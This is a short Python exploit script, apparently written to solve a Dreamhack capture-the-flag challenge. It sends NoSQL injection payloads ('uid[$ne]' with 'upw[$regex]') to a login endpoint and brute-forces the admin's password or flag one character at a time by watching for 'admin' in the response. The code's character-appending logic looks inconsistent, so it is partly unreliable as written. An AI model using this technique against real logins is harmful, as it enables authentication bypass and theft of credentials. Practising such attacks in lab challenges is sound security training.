import requests
ascii_letters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
def url(password):
#    params={'uid[$ne]':'guest','upw[$regex]':'D.*$'}
    params={'uid[$ne]':'guest','upw[$regex]':password}
    r=requests.get('http://host1.dreamhack.games:21604/login',params=params)
    print("---------------------rr-----------------")
    print(r)
    return r
def comp(flag):
    for i in ascii_letters:
        ch=flag+'['+i+']'
        print("ch : "+ch)
        print("url(ch) : "+url(ch).text)
        if "admin" in url(ch).text:
            flag+='['+i+']'
            print("flag : "+flag)
            break
    return i
if __name__=='__main__':
    flag='[D]H{'
    for l in range(1,33):
        flag+=comp(flag)
        print(flag+"}")